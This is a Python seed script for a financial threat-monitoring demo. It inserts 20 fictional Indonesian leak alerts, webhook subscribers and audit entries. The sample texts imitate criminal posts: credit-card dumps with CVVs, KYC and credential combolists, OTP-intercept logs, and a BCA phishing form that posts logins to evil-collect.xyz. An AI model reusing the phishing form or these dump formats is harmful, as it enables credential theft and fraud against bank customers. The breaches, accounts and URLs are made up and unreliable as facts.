"""Seed the database with 20 narrative demo threats for PIDI DIGDAYA judges.

Creates a realistic threat landscape:
- 3 CRITICAL: massive card dump, KYC leak, multi-bank credential breach
- 5 HIGH: NPWP leak, account dumps, phishing kit, OTP intercept, fintech breach
- 8 MEDIUM: smaller pastes, GitHub commits, forum reposts
- 4 LOW: old data, low-confidence, reposts

Timestamps cluster in last 48h to show an "active threat period".

Usage: python -m scripts.seed_demo
"""

from __future__ import annotations

import asyncio
import hashlib
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy import text

from app.database import async_session, init_db
from app.models.audit import AuditLog, fingerprint
from app.models.threat import Severity, SourceType, Threat, ThreatStatus
from app.models.webhook import WebhookSubscription

# ──────────────────────────────────────────────────────
# 3 CRITICAL threats
# ──────────────────────────────────────────────────────

CRITICAL_THREATS = [
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/cc_dump_indo/1547",
        "raw_content": (
            "MEGA DUMP - 240.000 kartu kredit nasabah BRI\n"
            "Format: CC|EXP|CVV|NAMA|ALAMAT|NO_HP\n"
            "4052900000000000|12/27|321|BUDI SANTOSO|JL SUDIRMAN 45 JAKARTA|081234567890\n"
            "4052900000000001|03/28|445|SITI RAHAYU|JL GATOT SUBROTO 12 BANDUNG|081298765432\n"
            "4052900000000002|08/27|112|AGUS PRATAMA|JL DIPONEGORO 8 SURABAYA|081356789012\n"
            "... [240.247 baris lainnya]\n"
            "Tested 95% live. Price: $5000 for full dump. DM @darkdealer_id\n"
            "Tags: #BRI #kartukredit #carding #indonesia #freshcc"
        ),
        "entities": [
            {"type": "CREDIT_CARD", "value": "405290******0000", "confidence": 0.95, "context": "kartu kredit nasabah BRI"},
            {"type": "CREDIT_CARD", "value": "405290******0001", "confidence": 0.95, "context": "240.000 kartu kredit"},
            {"type": "CREDIT_CARD", "value": "405290******0002", "confidence": 0.95, "context": "MEGA DUMP BRI"},
            {"type": "CVV", "value": "***", "confidence": 0.75, "context": "CC|EXP|CVV format"},
            {"type": "CVV", "value": "***", "confidence": 0.75, "context": "tested 95% live"},
            {"type": "NIK", "value": "320101**********", "confidence": 0.60, "context": "alamat lengkap"},
            {"type": "BANK_NAME", "value": "BRI", "confidence": 1.0, "context": "nasabah BRI"},
            {"type": "BANKING_KEYWORD", "value": "kartu kredit", "confidence": 1.0, "context": "240.000 kartu kredit"},
            {"type": "BANKING_KEYWORD", "value": "carding", "confidence": 1.0, "context": "#carding"},
            {"type": "BANKING_KEYWORD", "value": "fresh cc", "confidence": 1.0, "context": "#freshcc"},
        ],
        "risk_score": 98, "severity": Severity.CRITICAL,
        "status": ThreatStatus.VERIFIED,
        "tags": ["BRI"],
        "hours_ago": 6,
    },
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/findata_id/3201",
        "raw_content": (
            "KYC DUMP E-WALLET INDONESIA\n"
            "89.000 record: NIK + Selfie + No HP + Alamat\n"
            "Platform: DANA, OVO, GoPay, ShopeePay\n"
            "NIK: 3201011506900001 | Nama: Ahmad Fauzi | HP: 081234567890 | Selfie: [img]\n"
            "NIK: 3573015506850002 | Nama: Dewi Lestari | HP: 081298765432 | Selfie: [img]\n"
            "NIK: 3175021506780003 | Nama: Rudi Hartono | HP: 081356789012 | Selfie: [img]\n"
            "... [89.247 baris lainnya]\n"
            "Full package $3000. Sample gratis 100 record. DM"
        ),
        "entities": [
            {"type": "NIK", "value": "320101**********", "confidence": 0.90, "context": "KYC DUMP 89.000 record"},
            {"type": "NIK", "value": "357301**********", "confidence": 0.90, "context": "NIK + Selfie + No HP"},
            {"type": "NIK", "value": "317502**********", "confidence": 0.90, "context": "platform e-wallet"},
            {"type": "BANK_NAME", "value": "DANA", "confidence": 1.0, "context": "DANA, OVO, GoPay"},
            {"type": "BANK_NAME", "value": "OVO", "confidence": 1.0, "context": "e-wallet Indonesia"},
            {"type": "BANK_NAME", "value": "GoPay", "confidence": 1.0, "context": "KYC dump"},
            {"type": "BANK_NAME", "value": "ShopeePay", "confidence": 1.0, "context": "platform e-wallet"},
            {"type": "BANKING_KEYWORD", "value": "data nasabah", "confidence": 1.0, "context": "KYC dump"},
            {"type": "BANKING_KEYWORD", "value": "bocor", "confidence": 1.0, "context": "89.000 record"},
        ],
        "risk_score": 96, "severity": Severity.CRITICAL,
        "status": ThreatStatus.NEW,
        "tags": ["DANA", "OVO", "GoPay", "ShopeePay"],
        "hours_ago": 3,
    },
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Xk9mNp4R",
        "raw_content": (
            "=== COMBOLIST BANKING INDONESIA 2026 ===\n"
            "12.450 akun internet banking verified\n"
            "Bank: BCA, Mandiri, BNI\n"
            "Format: email|password|bank|last_login\n"
            "user1@gmail.com|BcaKu2026!|BCA|2026-03-15\n"
            "admin@company.co.id|Mandiri_Secure1|Mandiri|2026-03-14\n"
            "finance@corp.id|BNI!Banking99|BNI|2026-03-16\n"
            "... [12.447 baris lainnya]\n"
            "Source: phishing campaign Jan-Mar 2026\n"
            "90% tested valid. Premium list."
        ),
        "entities": [
            {"type": "CREDENTIAL", "value": "user=user1@gmail.com pass=***", "confidence": 0.90, "context": "12.450 akun banking"},
            {"type": "CREDENTIAL", "value": "user=admin@company.co.id pass=***", "confidence": 0.90, "context": "internet banking"},
            {"type": "CREDENTIAL", "value": "user=finance@corp.id pass=***", "confidence": 0.90, "context": "combolist verified"},
            {"type": "BANK_NAME", "value": "BCA", "confidence": 1.0, "context": "BCA, Mandiri, BNI"},
            {"type": "BANK_NAME", "value": "Mandiri", "confidence": 1.0, "context": "banking Indonesia"},
            {"type": "BANK_NAME", "value": "BNI", "confidence": 1.0, "context": "3 bank nasional"},
            {"type": "BANKING_KEYWORD", "value": "internet banking", "confidence": 1.0, "context": "internet banking verified"},
            {"type": "BANKING_KEYWORD", "value": "combolist", "confidence": 1.0, "context": "COMBOLIST BANKING"},
        ],
        "risk_score": 95, "severity": Severity.CRITICAL,
        "status": ThreatStatus.NEW,
        "tags": ["BCA", "Mandiri", "BNI"],
        "hours_ago": 12,
    },
]

# ──────────────────────────────────────────────────────
# 5 HIGH threats
# ──────────────────────────────────────────────────────

HIGH_THREATS = [
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Yz7bWq2K",
        "raw_content": (
            "NPWP Dump - 3.200 Wajib Pajak Indonesia\n"
            "NPWP: 01.234.567.8-901.234 | PT Sejahtera Abadi | Jakarta\n"
            "NPWP: 02.345.678.9-012.345 | CV Maju Bersama | Surabaya\n"
            "NPWP: 03.456.789.0-123.456 | Yayasan Peduli | Bandung\n"
            "... [3.197 baris lainnya]\n"
            "Cocok untuk penipuan pajak. Dijual murah."
        ),
        "entities": [
            {"type": "NPWP", "value": "01.234.567.8-901.234", "confidence": 0.85, "context": "3.200 Wajib Pajak"},
            {"type": "NPWP", "value": "02.345.678.9-012.345", "confidence": 0.85, "context": "NPWP dump"},
            {"type": "NPWP", "value": "03.456.789.0-123.456", "confidence": 0.85, "context": "penipuan pajak"},
            {"type": "BANKING_KEYWORD", "value": "dump", "confidence": 1.0, "context": "NPWP Dump"},
        ],
        "risk_score": 72, "severity": Severity.HIGH,
        "status": ThreatStatus.VERIFIED,
        "tags": [],
        "hours_ago": 18,
    },
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/bank_leak_idn/892",
        "raw_content": (
            "Nomor rekening BSI & BTN - 5.400 account\n"
            "Rek BSI: 7001234567890 | Saldo: Rp 45.000.000 | Nama: Hasan\n"
            "Rek BTN: 0012345678901 | Saldo: Rp 12.500.000 | Nama: Fatimah\n"
            "Include mutasi 6 bulan terakhir.\n"
            "DM for price. Bulk discount available."
        ),
        "entities": [
            {"type": "ACCOUNT_NUMBER", "value": "700****890", "confidence": 0.85, "context": "5.400 account BSI"},
            {"type": "ACCOUNT_NUMBER", "value": "001****901", "confidence": 0.85, "context": "rekening BTN"},
            {"type": "BANK_NAME", "value": "BSI", "confidence": 1.0, "context": "BSI & BTN"},
            {"type": "BANK_NAME", "value": "BTN", "confidence": 1.0, "context": "nomor rekening"},
            {"type": "BANKING_KEYWORD", "value": "rekening", "confidence": 1.0, "context": "nomor rekening"},
            {"type": "BANKING_KEYWORD", "value": "saldo", "confidence": 1.0, "context": "Saldo: Rp"},
            {"type": "BANKING_KEYWORD", "value": "mutasi", "confidence": 1.0, "context": "mutasi 6 bulan"},
        ],
        "risk_score": 78, "severity": Severity.HIGH,
        "status": ThreatStatus.NEW,
        "tags": ["BSI", "BTN"],
        "hours_ago": 8,
    },
    {
        "source_type": SourceType.GITHUB,
        "source_url": "https://github.com/threat-actor/phish-bca/blob/main/index.html",
        "raw_content": (
            "<!-- Phishing Kit BCA KlikBCA -->\n"
            "<title>KlikBCA - Internet Banking</title>\n"
            "<form action='https://evil-collect.xyz/grab.php' method='POST'>\n"
            "  <input name='user_id' placeholder='User ID BCA'>\n"
            "  <input name='pin' type='password' placeholder='PIN Internet Banking'>\n"
            "  <input name='otp' placeholder='Kode OTP / KeyBCA'>\n"
            "</form>\n"
            "<!-- Hosted on GitHub Pages, auto-deploy from this repo -->"
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "BCA", "confidence": 1.0, "context": "Phishing Kit BCA KlikBCA"},
            {"type": "BANKING_KEYWORD", "value": "internet banking", "confidence": 1.0, "context": "Internet Banking BCA"},
            {"type": "BANKING_KEYWORD", "value": "PIN", "confidence": 1.0, "context": "PIN Internet Banking"},
            {"type": "BANKING_KEYWORD", "value": "kode OTP", "confidence": 1.0, "context": "Kode OTP / KeyBCA"},
        ],
        "risk_score": 82, "severity": Severity.HIGH,
        "status": ThreatStatus.VERIFIED,
        "tags": ["BCA"],
        "hours_ago": 24,
    },
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Mn0pQr34",
        "raw_content": (
            "OTP Intercept Log - Permata & CIMB Niaga\n"
            "Nasabah: +6281234567890 | OTP: 847291 | Bank: Permata | Time: 2026-03-17 14:23\n"
            "Nasabah: +6285678901234 | OTP: 193847 | Bank: CIMB | Time: 2026-03-17 14:25\n"
            "Nasabah: +6287890123456 | OTP: 562914 | Bank: Permata | Time: 2026-03-17 14:28\n"
            "SS7 intercept aktif. Realtime feed tersedia."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "Permata", "confidence": 1.0, "context": "Permata & CIMB Niaga"},
            {"type": "BANK_NAME", "value": "CIMB", "confidence": 1.0, "context": "OTP Intercept"},
            {"type": "BANKING_KEYWORD", "value": "kode OTP", "confidence": 1.0, "context": "OTP intercept SS7"},
            {"type": "BANKING_KEYWORD", "value": "mobile banking", "confidence": 1.0, "context": "realtime feed"},
        ],
        "risk_score": 80, "severity": Severity.HIGH,
        "status": ThreatStatus.NEW,
        "tags": ["Permata", "CIMB"],
        "hours_ago": 15,
    },
    {
        "source_type": SourceType.HIBP,
        "source_url": "https://haveibeenpwned.com/breach/LinkAjaBreachMar2026",
        "raw_content": (
            "Breach: LinkAjaBreachMar2026\n"
            "Date: 2026-03-10\n"
            "Records: 67.000 accounts\n"
            "Data: email, phone, hashed_password, KTP_number, balance\n"
            "Source: API vulnerability in payment gateway\n"
            "Verified by HIBP team."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "LinkAja", "confidence": 1.0, "context": "LinkAja breach"},
            {"type": "BANKING_KEYWORD", "value": "leak", "confidence": 1.0, "context": "67.000 accounts"},
            {"type": "BANKING_KEYWORD", "value": "data nasabah", "confidence": 1.0, "context": "email, phone, KTP"},
        ],
        "risk_score": 75, "severity": Severity.HIGH,
        "status": ThreatStatus.VERIFIED,
        "tags": ["LinkAja"],
        "hours_ago": 36,
    },
]

# ──────────────────────────────────────────────────────
# 8 MEDIUM threats
# ──────────────────────────────────────────────────────

MEDIUM_THREATS = [
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Ab3cDe45",
        "raw_content": (
            "Small leak - 120 akun m-banking BRI\n"
            "081234567890|pin123456|BRI\n"
            "081298765432|bripwd99|BRI\n"
            "Batch kecil, mungkin dari phishing lokal."
        ),
        "entities": [
            {"type": "CREDENTIAL", "value": "user=081234567890 pass=***", "confidence": 0.80, "context": "m-banking BRI"},
            {"type": "CREDENTIAL", "value": "user=081298765432 pass=***", "confidence": 0.80, "context": "120 akun"},
            {"type": "BANK_NAME", "value": "BRI", "confidence": 1.0, "context": "akun m-banking BRI"},
            {"type": "BANKING_KEYWORD", "value": "m-banking", "confidence": 1.0, "context": "m-banking BRI"},
        ],
        "risk_score": 55, "severity": Severity.MEDIUM,
        "status": ThreatStatus.NEW,
        "tags": ["BRI"],
        "hours_ago": 40,
    },
    {
        "source_type": SourceType.GITHUB,
        "source_url": "https://github.com/intern2026/tugas-akhir/blob/main/.env.production",
        "raw_content": (
            "# Accidentally committed production credentials\n"
            "MANDIRI_API_KEY=sk_live_mandiri_abc123def456\n"
            "MANDIRI_SECRET=prod_secret_mandiri_2026\n"
            "DB_URL=postgres://mandiri_admin:M4nd1r1Pr0d!@db.mandiri-api.co.id/production"
        ),
        "entities": [
            {"type": "CREDENTIAL", "value": "user=mandiri_admin pass=***", "confidence": 0.85, "context": "production credentials"},
            {"type": "BANK_NAME", "value": "Mandiri", "confidence": 1.0, "context": "MANDIRI_API_KEY"},
        ],
        "risk_score": 52, "severity": Severity.MEDIUM,
        "status": ThreatStatus.MITIGATED,
        "tags": ["Mandiri"],
        "hours_ago": 72,
    },
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/indo_leak_alert/1305",
        "raw_content": (
            "Jual data mutasi rekening Danamon 2025-2026\n"
            "800 record, include nama, no rek, saldo terakhir\n"
            "DM for sample. Harga nego."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "Danamon", "confidence": 1.0, "context": "rekening Danamon"},
            {"type": "BANKING_KEYWORD", "value": "mutasi", "confidence": 1.0, "context": "data mutasi"},
            {"type": "BANKING_KEYWORD", "value": "rekening", "confidence": 1.0, "context": "rekening Danamon"},
            {"type": "BANKING_KEYWORD", "value": "saldo", "confidence": 1.0, "context": "saldo terakhir"},
        ],
        "risk_score": 45, "severity": Severity.MEDIUM,
        "status": ThreatStatus.NEW,
        "tags": ["Danamon"],
        "hours_ago": 10,
    },
    {
        "source_type": SourceType.GITHUB,
        "source_url": "https://github.com/dev-test/project/blob/main/test_data.csv",
        "raw_content": (
            "nama,nik,no_rekening_bni,saldo\n"
            "Ahmad Wijaya,3201011506900001,0091234567890,15000000\n"
            "Siti Nurhaliza,3573015506850002,0181234567890,8500000\n"
            "Committed by intern, contains real customer data."
        ),
        "entities": [
            {"type": "NIK", "value": "320101**********", "confidence": 0.70, "context": "test_data.csv BNI"},
            {"type": "NIK", "value": "357301**********", "confidence": 0.70, "context": "real customer data"},
            {"type": "ACCOUNT_NUMBER", "value": "009****890", "confidence": 0.80, "context": "no_rekening_bni"},
            {"type": "BANK_NAME", "value": "BNI", "confidence": 1.0, "context": "no_rekening_bni"},
        ],
        "risk_score": 48, "severity": Severity.MEDIUM,
        "status": ThreatStatus.MITIGATED,
        "tags": ["BNI"],
        "hours_ago": 96,
    },
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Fg6hIj78",
        "raw_content": (
            "Data NPWP perusahaan Jakarta 2026\n"
            "NPWP: 04.567.890.1-234.567 | PT Makmur Jaya | Senen\n"
            "NPWP: 05.678.901.2-345.678 | CV Berkah Abadi | Menteng\n"
            "300 record total."
        ),
        "entities": [
            {"type": "NPWP", "value": "04.567.890.1-234.567", "confidence": 0.80, "context": "NPWP perusahaan"},
            {"type": "NPWP", "value": "05.678.901.2-345.678", "confidence": 0.80, "context": "300 record"},
            {"type": "BANKING_KEYWORD", "value": "dump", "confidence": 1.0, "context": "data NPWP"},
        ],
        "risk_score": 42, "severity": Severity.MEDIUM,
        "status": ThreatStatus.NEW,
        "tags": [],
        "hours_ago": 55,
    },
    {
        "source_type": SourceType.GOOGLE_DORK,
        "source_url": "https://www.google.com/search?q=shopeepay+breach+2026",
        "raw_content": (
            "Breach: ShopeePay2026\n"
            "Date: 2026-02-28\n"
            "Records: 8.200 Indonesian users\n"
            "Data: email, hashed_password, phone\n"
            "No financial data exposed directly."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "ShopeePay", "confidence": 1.0, "context": "ShopeePay breach"},
            {"type": "BANKING_KEYWORD", "value": "leak", "confidence": 1.0, "context": "8.200 users"},
        ],
        "risk_score": 38, "severity": Severity.MEDIUM,
        "status": ThreatStatus.VERIFIED,
        "tags": ["ShopeePay"],
        "hours_ago": 168,
    },
    {
        "source_type": SourceType.GITHUB,
        "source_url": "https://github.com/random/backup/blob/main/db_dump.sql",
        "raw_content": (
            "-- Database dump from staging server\n"
            "INSERT INTO nasabah VALUES ('BCA', '0121234567890', 'Andi Wijaya', '3201011506900001', 25000000);\n"
            "INSERT INTO nasabah VALUES ('BCA', '0131234567890', 'Dewi Sari', '3573015506850002', 18000000);\n"
            "-- Contains 450 rows of customer data"
        ),
        "entities": [
            {"type": "NIK", "value": "320101**********", "confidence": 0.70, "context": "db_dump.sql BCA"},
            {"type": "ACCOUNT_NUMBER", "value": "012****890", "confidence": 0.80, "context": "nasabah BCA"},
            {"type": "BANK_NAME", "value": "BCA", "confidence": 1.0, "context": "staging server BCA"},
            {"type": "BANKING_KEYWORD", "value": "data nasabah", "confidence": 1.0, "context": "customer data"},
        ],
        "risk_score": 50, "severity": Severity.MEDIUM,
        "status": ThreatStatus.NEW,
        "tags": ["BCA"],
        "hours_ago": 120,
    },
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/cc_dump_indo/1120",
        "raw_content": (
            "CC Mega Bank - small batch\n"
            "4265040000000001|01/28|654|RUDI HERMAWAN|JAKARTA\n"
            "4265050000000002|05/28|321|ANA SUSANTI|BEKASI\n"
            "50 kartu, tested 70% live."
        ),
        "entities": [
            {"type": "CREDIT_CARD", "value": "426504******0001", "confidence": 0.95, "context": "CC Mega Bank"},
            {"type": "CREDIT_CARD", "value": "426505******0002", "confidence": 0.95, "context": "50 kartu"},
            {"type": "CVV", "value": "***", "confidence": 0.75, "context": "CC|EXP|CVV"},
            {"type": "BANK_NAME", "value": "Mega", "confidence": 1.0, "context": "Mega Bank"},
            {"type": "BANKING_KEYWORD", "value": "carding", "confidence": 1.0, "context": "tested live"},
        ],
        "risk_score": 58, "severity": Severity.MEDIUM,
        "status": ThreatStatus.NEW,
        "tags": ["Mega"],
        "hours_ago": 28,
    },
]

# ──────────────────────────────────────────────────────
# 4 LOW threats
# ──────────────────────────────────────────────────────

LOW_THREATS = [
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/findata_id/2890",
        "raw_content": (
            "Re-share dari 2024: data lama nasabah Bank Jago\n"
            "Sudah expired, kebanyakan akun sudah ditutup.\n"
            "Posting ulang dari channel lain."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "Bank Jago", "confidence": 1.0, "context": "data lama Bank Jago"},
            {"type": "BANKING_KEYWORD", "value": "data nasabah", "confidence": 1.0, "context": "re-share 2024"},
        ],
        "risk_score": 15, "severity": Severity.LOW,
        "status": ThreatStatus.FALSE_POSITIVE,
        "tags": ["Bank Jago"],
        "hours_ago": 480,
    },
    {
        "source_type": SourceType.PASTE,
        "source_url": "https://pastebin.com/Qr5sTu67",
        "raw_content": (
            "Test data - looks like financial records but possibly fake\n"
            "CC: 1234567890123456 (fails Luhn)\n"
            "NIK: 9999990000000000 (invalid province)\n"
            "Likely honeypot or training data."
        ),
        "entities": [
            {"type": "BANKING_KEYWORD", "value": "credit card", "confidence": 1.0, "context": "test data"},
        ],
        "risk_score": 12, "severity": Severity.LOW,
        "status": ThreatStatus.FALSE_POSITIVE,
        "tags": [],
        "hours_ago": 360,
    },
    {
        "source_type": SourceType.TELEGRAM,
        "source_url": "https://t.me/indo_leak_alert/980",
        "raw_content": (
            "Ada yang punya data Jenius?\n"
            "Saya cari buat riset kampus.\n"
            "Bukan untuk tujuan jahat, hanya research."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "Jenius", "confidence": 1.0, "context": "data Jenius"},
            {"type": "BANKING_KEYWORD", "value": "data nasabah", "confidence": 0.40, "context": "riset kampus"},
        ],
        "risk_score": 18, "severity": Severity.LOW,
        "status": ThreatStatus.NEW,
        "tags": ["Jenius"],
        "hours_ago": 200,
    },
    {
        "source_type": SourceType.GOOGLE_DORK,
        "source_url": "https://www.google.com/search?q=bukopin+data+leak+2023",
        "raw_content": (
            "Breach: OldBukopinLeak (originally from 2023)\n"
            "Re-indexed by HIBP. 1.200 email+password combos.\n"
            "Most passwords already rotated."
        ),
        "entities": [
            {"type": "BANK_NAME", "value": "Bukopin", "confidence": 1.0, "context": "Bukopin leak 2023"},
            {"type": "BANKING_KEYWORD", "value": "leak", "confidence": 1.0, "context": "old breach"},
        ],
        "risk_score": 22, "severity": Severity.LOW,
        "status": ThreatStatus.MITIGATED,
        "tags": ["Bukopin"],
        "hours_ago": 600,
    },
]


ALL_THREATS = CRITICAL_THREATS + HIGH_THREATS + MEDIUM_THREATS + LOW_THREATS


async def seed() -> None:
    await init_db()

    async with async_session() as session:
        # Clean existing demo data (child tables first for FK safety)
        for table in ("alerts", "audit_logs", "webhook_subscriptions", "threats"):
            await session.execute(text(f"DELETE FROM {table}"))
        await session.commit()

        now = datetime.now(timezone.utc)
        threat_ids: list[uuid.UUID] = []
        for d in ALL_THREATS:
            created = now - timedelta(hours=d["hours_ago"])
            content = d["raw_content"]
            h = hashlib.sha256(content.encode()).hexdigest()

            from app.models.threat import mask_sensitive
            tid = uuid.uuid4()
            threat_ids.append(tid)
            threat = Threat(
                id=tid,
                source_type=d["source_type"],
                source_url=d["source_url"],
                raw_content=content,
                content_preview=mask_sensitive(content),
                detected_entities={
                    "entities": d["entities"],
                    "count": len(d["entities"]),
                },
                content_hash=h,
                risk_score=d["risk_score"],
                severity=d["severity"],
                status=d["status"],
                institution_tags=d["tags"] if d["tags"] else None,
                created_at=created,
                updated_at=created,
            )
            session.add(threat)

        # Demo webhook subscribers (SOC / CSIRT) so the alert feature is populated.
        session.add_all([
            WebhookSubscription(
                url="https://soc.bri.co.id/hooks/shark-fin",
                institution="BRI", min_severity="HIGH", api_key="demo-bri-soc-key",
            ),
            WebhookSubscription(
                url="https://csirt-fintech.id/ingest", institution="AFTECH",
                min_severity="CRITICAL", api_key="demo-aftech-csirt-key",
            ),
        ])

        # A few audit entries so the trail is non-empty on a fresh demo.
        demo_key = fingerprint("sharkfin-demo-key-2026")
        session.add_all([
            AuditLog(
                action="threat.status_update", actor=demo_key,
                target_id=threat_ids[0],
                detail={"from": "NEW", "to": "VERIFIED", "note": "Dikonfirmasi analis SOC"},
                created_at=now - timedelta(hours=5),
            ),
            AuditLog(
                action="report.export", actor=demo_key, target_id=threat_ids[0],
                detail={"format": "ojk"}, created_at=now - timedelta(hours=4, minutes=30),
            ),
            AuditLog(
                action="webhook.register", actor=demo_key, target_id=None,
                detail={"institution": "BRI", "min_severity": "HIGH"},
                created_at=now - timedelta(hours=4),
            ),
        ])

        await session.commit()

    counts = {"CRITICAL": 3, "HIGH": 5, "MEDIUM": 8, "LOW": 4}
    print(f"Seeded {len(ALL_THREATS)} demo threats:")
    for sev, n in counts.items():
        print(f"  {sev}: {n}")
    print("Seeded 2 webhook subscribers + 3 audit entries.")
    print("Done.")


if __name__ == "__main__":
    asyncio.run(seed())
